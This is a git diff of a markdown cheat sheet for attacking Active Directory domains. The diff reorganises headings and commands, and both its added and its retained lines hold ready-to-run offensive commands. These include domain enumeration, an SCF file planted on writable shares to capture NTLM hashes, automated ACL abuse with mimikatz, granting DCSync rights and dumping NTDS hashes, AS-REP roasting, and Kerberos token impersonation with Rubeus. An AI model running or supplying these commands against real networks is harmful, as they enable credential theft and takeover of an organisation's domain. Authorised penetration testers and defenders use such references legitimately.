@@ -2,7 +2,13 @@
 
 ## **Domain enum**
 
-### LDAP enum
+### GUI enumeration
+
+- [RSAT](https://download.microsoft.com/download/1/D/8/1D8B5022-5477-4B9A-8104-6A71FF9D98AB/WindowsTH-RSAT_WS_1709-x64.msu)
+
+> After installing RSAT, you can go to "Users and Computers AD =&gt; View =&gt; Advanced"
+
+### LDAP enumeration
 
 - [Bloodhound](https://github.com/BloodHoundAD/BloodHound) & [Sharphound injestor](https://github.com/BloodHoundAD/SharpHound3) or [bloodhound-python injestor](https://github.com/fox-it/BloodHound.py)
 - [Ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
@@ -13,7 +19,7 @@
 # Install full bloodhound
 sudo apt-get update && sudo apt-get install -y bloodhound python3-pip && pip3 install bloodhound
 # bloodhound-python
-bloodhound-python -d <DOMAIN> <user> -p <pass> -dc <FQDN-SERVER> -c All
+bloodhound-python -d <domain> <user> -p <pass> -dc <fqdn_dc> -c All
 # Custom queries
 https://github.com/hausec/Bloodhound-Custom-Queries
 
@@ -47,7 +53,7 @@ enum4linux -a <target>
 enum4linux <target> |grep "user:" | cut -d '[' -f2 | cut -d "]" -f1 > users.txt
 ```
 
-### DNS enum
+### DNS enumeration
 
 
 Domain computers 
@@ -67,13 +73,9 @@ adidnsdump -u <domain>\\<user> -p <pass> --dns-tcp
 SharpSniper.exe emusk <username> <password>
 ```
 
-## GUI enum
+### Shares enumeration
 
-- [RSAT](https://download.microsoft.com/download/1/D/8/1D8B5022-5477-4B9A-8104-6A71FF9D98AB/WindowsTH-RSAT_WS_1709-x64.msu)
-
-> After installing RSAT, you can go to "Users and Computers AD =&gt; View =&gt; Advanced"
-
-### Open shares \(SMB, NFS, FTP, etc\)
+Look for anonymous SMB, NFS, FTP, etc
 
 **SMB readable shares**
 
@@ -106,9 +108,9 @@ smb.native_lanman
 
 **SMB writable shares**
 
-upload this @scf_filename.scf and listen for the hash with Responder/NTLMrelayx
+upload this @scf_filename.scf and listen for hashs using Responder/NTLMrelayx
 
-> Note: add a @ at first letter of the filename will place the .scf file on the top of the shared folder
+> add a @ at first letter of the filename will place the .scf file on the top of the shared folder
 
 ```bash
 [Shell]
@@ -130,7 +132,7 @@ mount <target>:/home/xx /mnt/yy
 
 ## **ACLs**
 
-### Auto Exploit (ACLPWN)
+### ACLPwn
 
 - [aclpwn.py](https://github.com/fox-it/aclpwn.py)
 - [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)
@@ -152,38 +154,22 @@ python aclpwn.py -f <username> -ft user -d <domain>--restore aclpwn-20181129-182
 ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username <username> -Domain <domain> -Password <password>
 ```
 
-
 ### Manual Exploit DCSync
 
-Get ACL
-
 ```bash
+# Get ACL
 Get-DomainObjectAcl -Identity <username> -ResolveGUIDs ? { $_.SecurityIdentifier -Match $(ConvertTo-SID <domain>) }
-```
 
-add DCSync
-
-```bash
+# Add DCSync
 Add-DomainObjectAcl -TargetIdentity "DC=<domain>,DC=<local>" -PrincipalIdentity <username> -Rights DCSync
-```
 
-dump ntds 
-
-```bash
+# Dump ntds 
 meterpreter > dcsync_ntlm <DOMAIN>\<user>
-```
-
-## **Kerbrute AS-REP**
-
-```bash
-nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/users.txt <target>
-./kerbrute_linux_amd64 userenum -d <domain> usernames.txt -debug
 ```
 
 ---
 
-
-## **Impersonation Token**
+## **Kerberos Tokens**
 
 ### Tools
 
@@ -228,6 +214,10 @@ Rubeus.exe dump
 ```bash
 Rubeus.exe asreproast /outfile:asrep_hashes.txt
 
+nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/users.txt <target>
+
+./kerbrute_linux_amd64 userenum -d <domain> usernames.txt -debug
+
 impacket-GetNPUsers -usersfile kerb_users.txt <domain>/<user> -dc-ip <dc_ip>
 ```
 
@@ -254,7 +244,7 @@ Find if one is loggedon somewhere :
 
 ```bash
 crackmapexec smb <host_file> -u <user> -d <domain> -H <hash> --loggedon-users
-bloodhound.py -d <domain> -u <user> -p <password> -ns <IP-DC> -c LoggedOn
+bloodhound-python -d <domain> <user> -p <pass> -dc <fqdn_dc> -c LoggedOn
 ```
 
 Impersonate kerberos token
@@ -263,7 +253,7 @@ Impersonate kerberos token
 # Rubeus
 Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI>
 
-#TokenManipulation
+# TokenManipulation
 Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
 Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"
 
